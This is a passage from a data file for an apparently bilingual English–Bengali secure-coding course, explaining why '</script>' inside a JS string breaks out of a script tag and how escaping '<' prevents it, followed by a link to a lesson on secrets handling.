          en: 'The browser tokenizer looks for </script> regardless of whether it is inside a JS string literal. Escaping < to \\u003c neutralizes the tag boundary.',
          bn: 'ব্রাউজার স্ট্রিংয়ের ভেতরে থাকলেও </script> পেলেই ট্যাগ বন্ধ করে দেয়। < কে \\u003c তে রূপান্তর করলে এই ফাঁদ নষ্ট হয়ে যায়।'
        },
      },
    ],
  },
  next: {
    slug: 'secrets-handling',
    title: {
      en: 'Secrets Handling: Vault Patterns & Zero-Leakage Architecture',
      bn: 'সিক্রেট হ্যান্ডলিং: ভল্ট প্যাটার্ন এবং তথ্য ফাঁসরোধ আর্কিটেকচার'
    },
  },
};
